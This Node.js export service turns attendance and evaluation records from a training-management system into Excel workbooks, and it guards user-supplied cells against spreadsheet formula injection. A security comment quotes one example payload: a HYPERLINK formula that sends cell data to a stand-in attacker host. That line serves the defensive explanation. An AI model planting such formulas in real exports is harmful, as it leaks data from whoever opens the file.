const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const ExcelJS = require('exceljs');
const Attendance = require('../models/Attendance');
const Evaluation = require('../models/Evaluation');
const { toVN } = require('../helpers/dayjsConfig');
// ──────────────────────────────────────────────────────────
// Export Service
// ──────────────────────────────────────────────────────────
// Gom dữ liệu Attendance chưa export (syncStatus: PENDING),
// join với User/Schedule/Class/Team, tạo file Excel,
// rồi đánh dấu EXPORTED để lần sau không lấy lại.
// ──────────────────────────────────────────────────────────

const { ServiceError } = require('../helpers/ServiceError');

// Map status code → Vietnamese text
const STATUS_TEXT = {
  P: 'Có mặt',
  A: 'Vắng mặt',
  L: 'Đi muộn',
  EL: 'Có phép',
};

// ──────────────────────────────────────────────────────────
// CSV / XLSX formula injection guard (audit PR 4 — SEC-004)
// ──────────────────────────────────────────────────────────
// Spreadsheet apps (Excel, LibreOffice, Google Sheets when downloading)
// evaluate cells whose value STARTS with `= + - @ \t \r` as a formula.
// A user-controlled field like
//   name = '=HYPERLINK("http://attacker.tld/x?u="&A2,"Click")'
// is harmless in the web UI but auto-executes when an HR admin opens
// the exported .xlsx on Windows. WEBSERVICE() / external lookup gives
// the attacker outbound traffic + cookie exfil.
//
// Defence: prepend a single apostrophe so Excel treats the value as a
// literal string. The apostrophe itself is not displayed but is preserved
// on round-trip. Apply to EVERY user-controlled string that lands in a
// cell: name, department, teacherComment, remark, classCode, courseName,
// teamName, level, empCode, status text.
//
// Numbers and dates pass through untouched.
// ──────────────────────────────────────────────────────────
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const safeCell = (value) => {
  if (typeof value !== 'string') return value;
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
};

/**
 * Build the aggregation pipeline to join Attendance with
 * User, Schedule, Class, and Team.
 *
 * @param {Object} opts
 * @param {Date}   opts.from          Start date filter
 * @param {Date}   opts.to            End date filter
 * @param {boolean} opts.includeExported  If true, include EXPORTED records
 * @returns {Array} MongoDB aggregation pipeline
 */
const buildExportPipeline = ({ from, to, includeExported = false, batchId }) => {
  // ── Stage 1: Filter by syncStatus / batchId ─────────────
  // Date range is applied AFTER the schedule $lookup (Stage 2b) so we
  // filter by the actual lesson date (schedule.startTime) rather than
  // Attendance.createdAt — which is the DB write time and may differ
  // from the session date by hours or days (P2-07 fix).
  const matchStage = {};
  if (batchId) {
    // Claimed export: select only our batch (P2-08).
    matchStage.exportBatchId = batchId;
  } else if (!includeExported) {
    matchStage.syncStatus = 'PENDING';
  }

  const pipeline = [];
  if (Object.keys(matchStage).length > 0) {
    pipeline.push({ $match: matchStage });
  }

  // ── Stage 2: Join Schedule ──────────────────────────────
  pipeline.push(
    { $lookup: { from: 'schedules', localField: 'scheduleId', foreignField: '_id', as: 'schedule' } },
    { $unwind: '$schedule' }
  );

  // ── Stage 2b: Filter by lesson date (schedule.startTime) ─
  if (from || to) {
    const dateFilter = {};
    if (from) dateFilter.$gte = new Date(from);
    if (to)   dateFilter.$lte = new Date(to);
    pipeline.push({ $match: { 'schedule.startTime': dateFilter } });
  }

  // ── Stage 3: Join User (nhân viên) ─────────────────────
  pipeline.push(
    { $lookup: { from: 'users', localField: 'userId', foreignField: '_id', as: 'user' } },
    { $unwind: '$user' }
  );

  // ── Stage 4: Join Class ─────────────────────────────────
  pipeline.push(
    { $lookup: { from: 'classes', localField: 'schedule.classId', foreignField: '_id', as: 'class' } },
    { $unwind: '$class' }
  );

  // ── Stage 5: Join Team ──────────────────────────────────
  pipeline.push(
    { $lookup: { from: 'teams', localField: 'schedule.bookedTeamId', foreignField: '_id', as: 'team' } },
    { $unwind: { path: '$team', preserveNullAndEmptyArrays: true } }
  );

  // ── Stage 6: Projection ────────────────────────────────
  pipeline.push({
    $project: {
      _id: 1,
      empCode: '$user.empCode',
      userName: '$user.name',
      department: '$user.department',
      userRole: '$user.role',
      classCode: '$class.classCode',
      courseName: '$class.courseName',
      teamName: { $ifNull: ['$team.name', 'N/A'] },
      startTime: '$schedule.startTime',
      endTime: '$schedule.endTime',
      durationMinutes: {
        $divide: [{ $subtract: ['$schedule.endTime', '$schedule.startTime'] }, 60000],
      },
      roomLink: { $ifNull: ['$schedule.roomLink', ''] },
      status: '$status',
      remark: '$remark',
      attendanceDate: '$createdAt',
      syncStatus: '$syncStatus',
      exportedAt: '$exportedAt',
    },
  });

  pipeline.push({ $sort: { startTime: 1, empCode: 1 } });

  return pipeline;
};

/**
 * Query pending attendance records for export.
 *
 * @param {Object} opts  { from?, to?, includeExported? }
 * @returns {Array} Flattened attendance records with all joins
 */
const queryExportData = async (opts = {}) => {
  const pipeline = buildExportPipeline(opts);
  return Attendance.aggregate(pipeline);
};

/**
 * Generate an Excel workbook from attendance data.
 *
 * @param {Array} records  Output from queryExportData
 * @returns {Buffer} Excel file as a Buffer
 */
const generateExcel = async (records) => {
  const workbook = new ExcelJS.Workbook();
  workbook.creator = 'TMS Export';
  workbook.created = new Date();

  const sheet = workbook.addWorksheet('Attendance Export', {
    headerFooter: { firstHeader: 'TMS - Báo Cáo Điểm Danh' },
  });

  // ── Define columns ───────────────────────────────────────
  sheet.columns = [
    { header: 'Mã NV',           key: 'empCode',       width: 12 },
    { header: 'Họ Tên',          key: 'userName',      width: 22 },
    { header: 'Phòng Ban',       key: 'department',    width: 18 },
    { header: 'Vai Trò',         key: 'userRole',      width: 12 },
    { header: 'Mã Lớp',          key: 'classCode',     width: 10 },
    { header: 'Khóa Học',        key: 'courseName',    width: 25 },
    { header: 'Nhóm',            key: 'teamName',      width: 18 },
    { header: 'Ngày Học',        key: 'dateStr',        width: 14 },
    { header: 'Giờ BĐ',         key: 'startStr',       width: 10 },
    { header: 'Giờ KT',          key: 'endStr',         width: 10 },
    { header: 'Thời Lượng (ph)', key: 'duration',       width: 14 },
    { header: 'Điểm Danh',      key: 'statusText',    width: 14 },
    { header: 'Mã ĐD',           key: 'status',        width: 8 },
    { header: 'Ghi Chú',         key: 'remark',        width: 25 },
    { header: 'Ngày Ghi',        key: 'attendanceDate', width: 18 },
  ];

  // ── Style header row ─────────────────────────────────────
  const headerRow = sheet.getRow(1);
  headerRow.font = { bold: true, color: { argb: 'FFFFFFFF' } };
  headerRow.fill = {
    type: 'pattern', pattern: 'solid',
    fgColor: { argb: 'FF2563EB' },
  };
  headerRow.alignment = { horizontal: 'center', vertical: 'middle' };
  headerRow.height = 24;

  // ── Add data rows ────────────────────────────────────────
  for (const r of records) {
    const startDate = new Date(r.startTime);
    const endDate = new Date(r.endTime);

    // SEC-004: every user-controllable string passes through safeCell()
    // to neutralise spreadsheet formula injection.
    sheet.addRow({
      empCode: safeCell(r.empCode),
      userName: safeCell(r.userName),
      department: safeCell(r.department || ''),
      userRole: safeCell(r.userRole),
      classCode: safeCell(r.classCode),
      courseName: safeCell(r.courseName),
      teamName: safeCell(r.teamName),
      dateStr: toVN(startDate).format('DD/MM/YYYY'),
      startStr: toVN(startDate).format('HH:mm'),
      endStr: toVN(endDate).format('HH:mm'),
      duration: Math.round(r.durationMinutes),
      statusText: safeCell(STATUS_TEXT[r.status] || r.status),
      status: r.status,
      remark: safeCell(r.remark || ''),
      attendanceDate: toVN(r.attendanceDate).format('DD/MM/YYYY HH:mm'),
    });
  }

  // ── Auto-filter on header row ────────────────────────────
  sheet.autoFilter = {
    from: { row: 1, column: 1 },
    to: { row: 1, column: sheet.columns.length },
  };

  // ── Generate buffer ──────────────────────────────────────
  return workbook.xlsx.writeBuffer();
};

/**
 * Mark attendance records as EXPORTED.
 * Called AFTER the Excel file has been successfully generated.
 *
 * @param {Array<ObjectId>} ids  Attendance document IDs
 * @returns {Object} { modifiedCount }
 */
const markAsExported = async (ids) => {
  const result = await Attendance.updateMany(
    { _id: { $in: ids } },
    {
      $set: {
        syncStatus: 'EXPORTED',
        exportedAt: new Date(),
      },
    }
  );
  return { modifiedCount: result.modifiedCount };
};

/**
 * Full export flow: atomic claim → generate Excel → mark exported.
 *
 * P2-08 race-condition fix: instead of query-then-mark (two separate ops
 * that two concurrent admins can interleave), we now:
 *   1. Atomically stamp all matching PENDING records with a unique
 *      exportBatchId and status=EXPORTING in a single updateMany.
 *   2. Query only the records we just claimed (by batchId).
 *   3. Generate the Excel from those records.
 *   4. Mark claimed records EXPORTED.
 *
 * If two admins export at the same moment, each gets a different batchId
 * and a disjoint set of records — no double-export.
 *
 * @param {Object} opts  { from?, to?, includeExported? }
 * @returns {Object} { buffer, filename, recordCount, markedCount }
 */
const exportAttendance = async (opts = {}) => {
  if (opts.includeExported) {
    // Re-export path: no claiming needed — just query and generate.
    const records = await queryExportData(opts);
    if (records.length === 0) {
      throw new ServiceError('Không có bản ghi nào để xuất (No records found)', 404);
    }
    const buffer = await generateExcel(records);
    const now = new Date();
    const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
    const filename = `TMS_Attendance_${dateStr}_${records.length}records.xlsx`;
    return { buffer, filename, recordCount: records.length, markedCount: 0 };
  }

  // 1. Find IDs of PENDING records that fall within the requested date range.
  //    We do this BEFORE claiming so we only claim what will actually appear
  //    in the file — records outside the range are never touched (P2-08R fix).
  const { from, to } = opts;
  const idPipeline = [
    { $match: { syncStatus: 'PENDING' } },
    { $lookup: { from: 'schedules', localField: 'scheduleId', foreignField: '_id', as: 'schedule' } },
    { $unwind: '$schedule' },
  ];
  if (from || to) {
    const dateFilter = {};
    if (from) dateFilter.$gte = new Date(from);
    if (to)   dateFilter.$lte = new Date(to);
    idPipeline.push({ $match: { 'schedule.startTime': dateFilter } });
  }
  idPipeline.push({ $project: { _id: 1 } });

  const matchingDocs = await Attendance.aggregate(idPipeline);
  const idsToExport = matchingDocs.map(d => d._id);

  if (idsToExport.length === 0) {
    throw new ServiceError('Không có bản ghi nào để xuất (No pending records found)', 404);
  }

  // 2. Atomically claim only those specific IDs (PENDING → EXPORTING + batchId).
  //    Using { _id: $in } + { syncStatus: PENDING } ensures we only claim records
  //    that are still PENDING even if a concurrent export ran between step 1 and 2.
  const batchId = uuidv4();
  const claimedResult = await Attendance.updateMany(
    { _id: { $in: idsToExport }, syncStatus: 'PENDING' },
    { $set: { syncStatus: 'EXPORTING', exportBatchId: batchId } }
  );

  // P2R-01: A concurrent export may have claimed all matching records between
  // our ID scan (step 1) and this updateMany (step 2). If modifiedCount === 0
  // we won zero records — returning an empty Excel and 200 would be misleading.
  // Throw 404 so the caller knows there is nothing to export right now.
  if (claimedResult.modifiedCount === 0) {
    throw new ServiceError(
      'Không có bản ghi nào để xuất — có thể đã được export đồng thời (No records claimed — concurrent export may have taken them)',
      404,
    );
  }

  // 3. Query our claimed records with full pipeline joins for Excel generation.
  const records = await queryExportData({ ...opts, batchId });

  // 4. Generate Excel
  const buffer = await generateExcel(records);

  // 5. Mark only our claimed records as EXPORTED.
  //    Because we claimed exactly the records we'll export, every claimed
  //    record appears in the file — no silent "marked but not included" records.
  const markedResult = await Attendance.updateMany(
    { exportBatchId: batchId },
    { $set: { syncStatus: 'EXPORTED', exportedAt: new Date() } }
  );

  const now = new Date();
  const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
  const filename = `TMS_Attendance_${dateStr}_${records.length}records.xlsx`;

  return { buffer, filename, recordCount: records.length, markedCount: markedResult.modifiedCount };
};

/**
 * Get export summary stats (how many PENDING vs EXPORTED).
 *
 * WHY use the pipeline instead of countDocuments?
 * countDocuments({ syncStatus: 'PENDING' }) counts ALL pending records,
 * including orphans (attendance for deleted schedules/users).
 * The pipeline drops orphans via $unwind, so the count matches
 * what the actual export would produce. No more "3 pending but 0 exportable".
 */
const getExportStats = async () => {
  // Count truly exportable PENDING records (same joins as export)
  const pendingPipeline = buildExportPipeline({ includeExported: false });
  // Replace projection + sort with a simple count
  // Remove $project and $sort stages, add $count
  const countPipeline = pendingPipeline.filter(
    stage => !stage.$project && !stage.$sort
  );
  countPipeline.push({ $count: 'total' });

  const [pendingResult] = await Attendance.aggregate(countPipeline);
  const pending = pendingResult?.total || 0;

  const exported = await Attendance.countDocuments({ syncStatus: 'EXPORTED' });

  // Phase 4 Surface 8 — "Last export" KPI: most recent exportedAt + how
  // many records share that batch (records updated together get the same
  // timestamp). Bucket within ±1s to tolerate per-row timestamp jitter.
  let lastExportAt = null;
  let lastExportCount = 0;
  const lastDoc = await Attendance
    .findOne({ syncStatus: 'EXPORTED', exportedAt: { $ne: null } })
    .select('exportedAt')
    .sort({ exportedAt: -1 })
    .lean();
  if (lastDoc?.exportedAt) {
    lastExportAt = lastDoc.exportedAt;
    const windowStart = new Date(lastExportAt.getTime() - 1000);
    const windowEnd   = new Date(lastExportAt.getTime() + 1000);
    lastExportCount = await Attendance.countDocuments({
      syncStatus: 'EXPORTED',
      exportedAt: { $gte: windowStart, $lte: windowEnd },
    });
  }

  return {
    pending,
    exported,
    total: pending + exported,
    lastExportAt,
    lastExportCount,
  };
};

// ──────────────────────────────────────────────────────────
// Evaluation Export
// ──────────────────────────────────────────────────────────
// Exports all evaluations as Excel, joined with Class + User.
// Unlike attendance, evaluations are NOT marked as exported —
// they can be re-exported any number of times (snapshots, not events).

const buildEvaluationPipeline = ({ from, to, classId } = {}) => {
  const matchStage = {};
  if (classId) matchStage.classId = new mongoose.Types.ObjectId(classId);
  if (from || to) {
    matchStage.updatedAt = {};
    if (from) matchStage.updatedAt.$gte = new Date(from);
    if (to) matchStage.updatedAt.$lte = new Date(to);
  }

  const pipeline = [];
  if (Object.keys(matchStage).length > 0) pipeline.push({ $match: matchStage });

  pipeline.push(
    { $lookup: { from: 'users', localField: 'userId', foreignField: '_id', as: 'user' } },
    { $unwind: '$user' },
    { $lookup: { from: 'classes', localField: 'classId', foreignField: '_id', as: 'class' } },
    { $unwind: '$class' },
    {
      $project: {
        _id: 1,
        empCode: '$user.empCode',
        userName: '$user.name',
        department: '$user.department',
        classCode: '$class.classCode',
        courseName: '$class.courseName',
        level: '$level',
        grammarScore: 1,
        vocabularyScore: 1,
        pronunciationScore: 1,
        fluencyScore: 1,
        averageScore: {
          $divide: [
            { $add: ['$grammarScore', '$vocabularyScore', '$pronunciationScore', '$fluencyScore'] },
            4,
          ],
        },
        teacherComment: '$teacherComment',
        updatedAt: 1,
      },
    },
    { $sort: { classCode: 1, empCode: 1 } }
  );

  return pipeline;
};

const queryEvaluationData = async (opts = {}) => Evaluation.aggregate(buildEvaluationPipeline(opts));

const generateEvaluationExcel = async (records) => {
  const workbook = new ExcelJS.Workbook();
  workbook.creator = 'TMS Export';
  workbook.created = new Date();

  const sheet = workbook.addWorksheet('Evaluation Export', {
    headerFooter: { firstHeader: 'TMS - Báo Cáo Đánh Giá' },
  });

  sheet.columns = [
    { header: 'Mã NV',         key: 'empCode',          width: 12 },
    { header: 'Họ Tên',        key: 'userName',         width: 22 },
    { header: 'Phòng Ban',     key: 'department',       width: 18 },
    { header: 'Mã Lớp',        key: 'classCode',        width: 10 },
    { header: 'Khóa Học',      key: 'courseName',       width: 25 },
    { header: 'Trình Độ',      key: 'level',            width: 12 },
    { header: 'Ngữ Pháp',      key: 'grammarScore',     width: 10 },
    { header: 'Từ Vựng',       key: 'vocabularyScore',  width: 10 },
    { header: 'Phát Âm',       key: 'pronunciationScore', width: 10 },
    { header: 'Trôi Chảy',     key: 'fluencyScore',     width: 10 },
    { header: 'Điểm TB',       key: 'averageScore',     width: 10 },
    { header: 'Nhận Xét',      key: 'teacherComment',   width: 35 },
    { header: 'Cập Nhật',      key: 'updatedStr',       width: 18 },
  ];

  const headerRow = sheet.getRow(1);
  headerRow.font = { bold: true, color: { argb: 'FFFFFFFF' } };
  headerRow.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FF2563EB' } };
  headerRow.alignment = { horizontal: 'center', vertical: 'middle' };
  headerRow.height = 24;

  for (const r of records) {
    // SEC-004: every user-controllable string passes through safeCell()
    // to neutralise spreadsheet formula injection.
    sheet.addRow({
      empCode:            safeCell(r.empCode),
      userName:           safeCell(r.userName),
      department:         safeCell(r.department || ''),
      classCode:          safeCell(r.classCode),
      courseName:         safeCell(r.courseName),
      level:              safeCell(r.level || ''),
      grammarScore:       r.grammarScore,
      vocabularyScore:    r.vocabularyScore,
      pronunciationScore: r.pronunciationScore,
      fluencyScore:       r.fluencyScore,
      averageScore:       Math.round(r.averageScore * 100) / 100,
      teacherComment:     safeCell(r.teacherComment || ''),
      updatedStr:         toVN(r.updatedAt).format('DD/MM/YYYY HH:mm'),
    });
  }

  sheet.autoFilter = {
    from: { row: 1, column: 1 },
    to: { row: 1, column: sheet.columns.length },
  };

  return workbook.xlsx.writeBuffer();
};

const exportEvaluations = async (opts = {}) => {
  const records = await queryEvaluationData(opts);

  if (records.length === 0) {
    throw new ServiceError('Không có bản ghi đánh giá nào để xuất (No evaluations found)', 404);
  }

  const buffer = await generateEvaluationExcel(records);
  const now = new Date();
  const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
  const filename = `TMS_Evaluations_${dateStr}_${records.length}records.xlsx`;

  return { buffer, filename, recordCount: records.length };
};

module.exports = {
  ServiceError,
  exportAttendance,
  exportEvaluations,
  getExportStats,
  queryExportData,
  queryEvaluationData,
  // Exported for unit tests (SEC-004 formula-injection guard)
  safeCell,
};
